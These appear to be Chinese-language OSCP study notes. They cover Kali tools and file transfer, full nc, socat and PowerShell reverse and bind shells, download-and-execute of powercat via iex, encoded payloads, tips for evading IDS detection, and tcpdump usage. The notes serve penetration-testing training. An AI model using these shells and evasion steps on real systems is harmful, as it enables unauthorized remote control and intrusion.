# OSCP 学习

## kali 知识点补充(基本工具)

**man -k 关键词模糊搜索**

```
┌──(root㉿kali)-[~/桌面/code]
└─# man -k partition
addpart (8)          - tell the kernel about the existence of a partition
cfdisk (8)           - display or manipulate a disk partition table
cgdisk (8)           - Curses-based GUID partition table (GPT) manipulator
cgpt (1)             - Utility to manipulate GPT partitions with Chromium OS extensions
cryptsetup-luksFormat (8) - initialize a LUKS partition and set the initial passphrase
delpart (8)          - tell the kernel to forget about a partition
extundelete (1)      - utility to undelete files from an ext3 or ext4 partition.
fdisk (8)            - manipulate disk partition table
fixparts (8)         - MBR partition table repair utility
gdisk (8)            - Interactive GUID partition table (GPT) manipulator
gparted (8)          - GNOME Partition Editor for manipulating disk partitions.
iostat (1)           - Report Central Processing Unit (CPU) statistics and input/output s...
mmcat (1)            - Output the contents of a partition to stdout
mmls (1)             - Display the partition layout of a volume system (partition tables)
mmstat (1)           - Display details about the volume system (partition tables)
parted (8)           - a partition manipulation program
partprobe (8)        - inform the OS of partition table changes
partx (8)            - tell the kernel about the presence and numbering of on-disk partit...

```

**apropos  命令：通过关键字查找定位手册页的名字和描述，相当于有-k参数的man **

**每个手册页里都有一个简短的描述。apropos在这个描述中查找keyword 。keyword是正则表达式**

**ls -liaht   h选项：以人们方便阅读的格式输出：Mb,kb,Gb**

**locate 配置文件updatedb.conf **

`ocate` 命令用来查找文件或目录。 `locate` 命令要比 `find -name` 快得多，原因在于它不会深入到文件系统中去搜索具体目录，而是搜索一个索引数据库 `/var/lib/mlocate/mlocate.db` 。这个数据库存放着系统中的所有文件信息。Linux 系统自动创建这个数据库，并且每天自动更新一次，因此，我们在用 `whereis` 和 `locate` 查找文件时，有时会找到已经被删除的数据，或者刚刚建立文件，却无法查找到，原因就是因为数据库文件没有被更新。为了避免这种情况，可以在使用 `locate` 之前，先使用 `updatedb` 命令，手动更新数据库。

**sed **

**awk**

**wc**

**comm 命令：逐行比较两个排序好的文件**

**diff   查看两个文件之间的区别**

**重点：**

**curl 和wget命令的复杂用法**

**nc 传输文件：**

```
kali@kali:~$ locate wget.exe
/usr/share/windows-resources/binaries/wget.exe
kali@kali:~$ nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe
(UNKNOWN) [10.11.0.22] 4444 (?) open


C:\Users\offsec> nc -nlvp 4444 > incoming.exe
listening on [any] 4444 ...
connect to [10.11.0.22] from <UNKNOWN) [10.11.0.4] 43459
^C
C:\Users\offsec>

```

```
nc  绑定命令行：
kali-pro:
nc -e /bin/bash -nvlp 4444
kali-full
nc -nv 192.168.61.132 4444
就可以进入kali-pro的bash环境
```

**socat**

**连接端口**

```
服务端：socat tcp-listen:4444 -
客户端：socat tcp:192.168.61.132:4444 - 
```

```
socat - TCP-LISTEN:8080,fork,reuseaddr      # 终端1 上启动 server
socat - TCP:localhost:8080                  # 终端2 上启动 client
```

`reuseaddr`：这个选项允许套接字重用处于“TIME_WAIT”状态的本地地址。这在需要在相同地址和端口上快速重新启动监听服务的情况下很有用。

**接收文件：**

**socat tcp4-listem:4444 open:2.tct,creat,append**

**发送文件：**

**cat 1.txt |socat - tcp4:192.168.110.129:333**

*端口转发*

**kali_full: **`socat tcp4-listen:8765,fork tcp4:192.168.110.1:80`

**每当有人访问kali_ful  tcp80端口的时候就将访问转发到192.168.110.1.80 上**

**fork 是每一个人访问就会新创建一个进程来监听一个会话，支持多个访问同时监听**

**socat 反弹shell**

**地址除了 **`TCP` 和 `TCP-LISTEN` 外，另外一个重要的地址类型就是 `EXEC` 可以执行程序并且把输入输出和另外一个地址串起来，建立反弹shell

```
socat TCP-LISTEN:8080,fork,reuseaddr  EXEC:/usr/bin/bash    # 服务端提供 shell
socat - TCP:192.168.110.129:8080                        # 客户端登录
```

**完善一点可以加些参数：**

```
socat TCP-LISTEN:8080,fork,reuseaddr  EXEC:/usr/bin/bash,pty,stderr   # 服务端
socat file:`tty`,raw,echo=0 TCP:localhost:8080                        # 客户端
```

**这样可以把 bash 的标准错误重定向给标准输出，并且用终端模式运行。客户端可以像刚才那样登录，但是还可以更高级点，用 tty 的方式访问，这样基本就得到了一个全功能的交互式终端了，可以在里面运行 vim, emacs 之类的程序。**

**更高级一点，使用 root 运行：**

**远程命令执行：**

`sudo socat TCP4-LISTEN:4433 STDOUT  |/bin/bash`

**当对方用nc 或socat 连接4433端口时输入的命令会被传入bash中执行**

*将执行的命令结果进行传输*

**	**服务器：socat - udp -l:2001

**	**客户端： echo "`**id**`**" |socat - udp4-datagram:1.1.1.1:2001**

**datagram 说明发送的是一个数据段**

```
┌──(root㉿kali)-[~]
└─# echo '1123qweqweqweqweqew'| socat - udp-datagram:192.168.110.129:2000
                                                                           
┌──(root💀kali)-[~]
└─# socat - udp-l:2000      
1123qweqweqweqweqew
```

```
┌──(root㉿kali)-[~]
└─# echo `id`| socat - udp-datagram:192.168.110.129:2000

┌──(root💀kali)-[~]
└─# socat - udp-l:2000                                             
uid=0(root) gid=0(root) 组=0(root)

┌──(root㉿kali)-[~]
└─# echo `whoami`|socat - udp-datagram:192.168.110.129:2000 

┌──(root💀kali)-[~]
└─# socat - udp-l:2000                                             
root

```

*创建UNIX套接字*

**服务端**

**socat UNIX-LISTEN:./test.sock,fork -**

**客户端**

**socat UNIX-CONNECT:./test.sock -**

> **UNIX 域套接字（Unix Domain Socket）是一种用于在同一台计算机上不同进程之间进行通信的机制，类似于网络套接字，但不涉及网络协议和网络通信。它们在本地文件系统上创建，用于在同一主机上的进程之间传递数据，而无需通过网络堆栈进行通信。**
>
> **虽然因特网域套接字可用于同一目的，但****UNIX域套接字的效率更高**。**UNIX域套接字仅仅复制数据**；它们并不执行协议处理，不需要添加或删除网络报头，无需计算检验和，不要产生顺序号，无需发送确认报文。

*UDP 全端口任意发包*

**for port in{1..65535}; do echo 'aaaaa'| socat - UDP4-DATAGRAM:192.168.110.129:$port; sleep 0.1;done**

*socat作为二进制编辑器*

`echo -e "\0\14\0\0\c"|socat -u file:/usr/bin/squid.exe,seek,seek=0x00074420`

**-u 表示单向传输   seek=0x00074420  代表在squid.exe中的偏移量  等于在指定偏移量处写入字节**

**socat还能做简单的web服务器(了解一下有这个功能就行)**

**socat 做透明代理**

***socat 加密绑定shell***

**要将加密添加到绑定shell中，我们将依赖于安全套接字Layer证书。 这一级别的加密将有助于规避入侵检测系统(IDS)，并将有助于隐藏我们正在收发的敏感数据。**

**openssl工具生成自签名证书：**

`openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 36 2 -out bind_shell.crt`

**req: 启动新的证书签名请求**

**-newkey：生成一个新的私钥**

**-RSA:2048:使用具有2,048位密钥长度的RSA加密。 **

**-nodes：存储私钥而不提供密码短语保护**

**-keyout：将密钥保存到文件**

**-x509:输出自签名证书而不是证书请求**

**-days：以days为单位设置有效期**

**-out：将证书保存到文件**

`sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin /bash` 开放端口

**我们将使用-在stdio和远程主机之间传输数据，OpenSSL在10.11.0.4:443上建立到Alice侦听器的远程SSL连接，verify=0禁用SSL证书验证：**

`socat - OPENSSL:10.11.0.4:443,verify=0`  连接端口

### powershell

**windows上的powershell默认是无法加载和执行ps1脚本的，需要用管理员身份运行powershell， Set-ExecutionPolicy Unrestricted  之后才能加载和运行脚本**

**POWERSHELL文件传输：**

**由于PowerShell的强大功能和灵活性，这并不像Netcat甚至Socat那样简单明了**

`powershell -c "(new-object System.Net.WebClient).DownloadFile('http:/ /10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"`

**通过实例化system.net.webclient对象，调用downlodfile方法来实现文件的下载**

**POWERSHELL创建反弹shell(复杂，但是比较重要，是原生的程序，靠山吃山理念):**

```
$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush();
}
$client.Close();
```

```
C:\Users\offsec> powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte =([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**powershell 绑定shell**

```
C:\Users\offsec> powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Sto
p()"
```

#### powercat

**利用POWERSHELL的优势来简化绑定/反弹shell的创建**

**kali中powercat 放在/usr/share/windows-source/powershell 下，将powercat.ps1**

**传输到windos上进行使用。**

**采用dot-sourcing的PiwerShell特性加载Powercat.ps1脚本，**

`. .\powercat.ps1`这将使脚本中声明的所有变量和函数可以在当前powershell作用域中直接引用，而不需要每次都执行脚本

**如果目标windows机器可以出网的话，可以使用iex cmdlet 直接下载powercat.ps1**

```
PS C:\Users\Offsec> iex (New-Object System.Net.Webclient).DownloadString('https://raw.
githubusercontent.com/besimorhino/powercat/master/powercat.ps1'
```

**注意：用dot-sourcing加载ps1脚本 只在当前POWERSHELL实例中有效，每次重启powershell时候都要重新加载**

```
PS C:\Users\13406\Desktop> powercat
You must select either client mode (-c) or listen mode (-l).
```

```
PS C:\Users\13406\Desktop> powercat -h

powercat - Netcat, The Powershell Version
Github Repository: https://github.com/besimorhino/powercat

This script attempts to implement the features of netcat in a powershell
script. It also contains extra features such as built-in relays, execute
powershell, and a dnscat2 client.

Usage: powercat [-c or -l] [-p port] [options]

  -c  <ip>        Client Mode. Provide the IP of the system you wish to connect to.
                  If you are using -dns, specify the DNS Server to send queries to.

  -l              Listen Mode. Start a listener on the port specified by -p.

  -p  <port>      Port. The port to connect to, or the port to listen on.

  -e  <proc>      Execute. Specify the name of the process to start.

  -ep             Execute Powershell. Start a pseudo powershell session. You can
                  declare variables and execute commands, but if you try to enter
                  another shell (nslookup, netsh, cmd, etc.) the shell will hang.

  -r  <str>       Relay. Used for relaying network traffic between two nodes.
                  Client Relay Format:   -r <protocol>:<ip addr>:<port>
                  Listener Relay Format: -r <protocol>:<port>
                  DNSCat2 Relay Format:  -r dns:<dns server>:<dns port>:<domain>

  -u              UDP Mode. Send traffic over UDP. Because it's UDP, the client
                  must send data before the server can respond.

  -dns  <domain>  DNS Mode. Send traffic over the dnscat2 dns covert channel.
                  Specify the dns server to -c, the dns port to -p, and specify the
                  domain to this option, -dns. This is only a client.
                  Get the server here: https://github.com/iagox86/dnscat2

  -dnsft <int>    DNS Failure Threshold. This is how many bad packets the client can
                  recieve before exiting. Set to zero when receiving files, and set high
                  for more stability over the internet.

  -t  <int>       Timeout. The number of seconds to wait before giving up on listening or
                  connecting. Default: 60

  -i  <input>     Input. Provide data to be sent down the pipe as soon as a connection is
                  established. Used for moving files. You can provide the path to a file,
                  a byte array object, or a string. You can also pipe any of those into
                  powercat, like 'aaaaaa' | powercat -c 10.1.1.1 -p 80

  -o  <type>      Output. Specify how powercat should return information to the console.
                  Valid options are 'Bytes', 'String', or 'Host'. Default is 'Host'.

  -of <path>      Output File.  Specify the path to a file to write output to.

  -d              Disconnect. powercat will disconnect after the connection is established
                  and the input from -i is sent. Used for scanning.

  -rep            Repeater. powercat will continually restart after it is disconnected.
                  Used for setting up a persistent server.

  -g              Generate Payload.  Returns a script as a string which will execute the
                  powercat with the options you have specified. -i, -d, and -rep will not
                  be incorporated.

  -ge             Generate Encoded Payload. Does the same as -g, but returns a string which
                  can be executed in this way: powershell -E <encoded string>

  -h              Print this help message.
```

**powercat实现文件传输**

```
kali > nc -nvlp 443 > reveiving_powercat.ps1

windows>powercat -c 192.168.110.128 -p 443 -i C:\Users\Offsec\powercat.ps1
```

**powercat反弹shell**( 没搞懂用powershell 反弹cmd是什么降智操作)

```
kali > nc -nvlp 4444
windows > powercat -c 192.168.110.128 -p 4444 -3 cmd.exe  
```

**powercat 绑定shell**（同理感觉降智）

```
opowercat -l -p 443 -e cmd.exe

nc  -nv 10.11.0.22 443 
```

**powercat 独立有效负载**

**Powercat还可以生成独立的有效负载。在Powercat的上下文中，有效负载是一组PowerShell指令以及Powercat脚本本身的一部分，它只包括用户请求的功能。**

**添加-g选项并将输出重定向到一个文件来创建一个独立的反向shell有效负载**

```
PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1
PS C:\Users\offsec> ./reverseshell.ps1
```

**像这样的独立负载可能很容易被IDS检测到。 具体来说，生成的脚本相当大，大约有300行代码。还有很多硬编码字符串，会很容易被检测出来**

**我们可以尝试通过使用PowerShell执行Base64编码命令的能力来克服这个问题。 为了生成一个独立的编码有效负载，我们使用-ge选项，并再次将输出重定向到一个文件：**

`PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1`

**生成的encodedreverseshell.ps1文件是一个可以使用powershell -e 选项执行的编码字符串，由于-e选项被设计为在命令行上提交复杂命令的一种方式，因此生成的encodedReverseShell.ps1脚本不能以与未编码的有效负载相同的方式执行**

**想要执行得吧文件中的整个字符串输给powershell  -e **

```
powershell -E xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.....

kali > nc -nvlp 443
```

#### wireshark

**注意：ftp是一个明文协议，通过wireshark抓包可以看到ftp客户端发送和接受的的命令和输出**

**注意一下breach 靶机中wireshark导入证书的操作**

#### tcpdump

**基于文本的网络嗅探器，本地用户权限决定了捕获网络通信量的能力，tcpdump既可以捕获来自网络的通信量，也可以读取现有的捕获文件（常常配合字符串处理命令和管道使用）如**

`sudo tcpdump -n -r password_cracking_filtered.pcap | awk -F" " '{print $3 }' | sort | uniq -c | head`

**添加过滤器**

```
sudo tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap
sudo tcpdump -n dst host 172.16.40.10 -r password_cracking_filtered.pcap
sudo tcpdump -n port 81 -r password_cracking_filtered.pcap


kali@kali:~$ sudo tcpdump -nX -r password_cracking_filtered.pcap
以十六进制的方式打开数据包

┌──(root㉿kali)-[~/桌面/baji'/breach 1.0]
└─# sudo tcpdump -nX -r ./_SSL_test_phase1.pcap 
reading from file ./_SSL_test_phase1.pcap, link-type EN10MB (Ethernet), snapshot length 262144
00:56:50.635257 IP 192.168.110.1.51260 > 192.168.110.255.32412: UDP, length 21
        0x0000:  4500 0031 49f4 0000 8011 9276 c0a8 6e01  E..1I......v..n.
        0x0010:  c0a8 6eff c83c 7e9c 001d e44a 4d2d 5345  ..n..<~....JM-SE
        0x0020:  4152 4348 202a 2048 5454 502f 312e 310d  ARCH.*.HTTP/1.1.
        0x0030:  0a                                       .

```

**tcpdump 使用高级过滤头：**
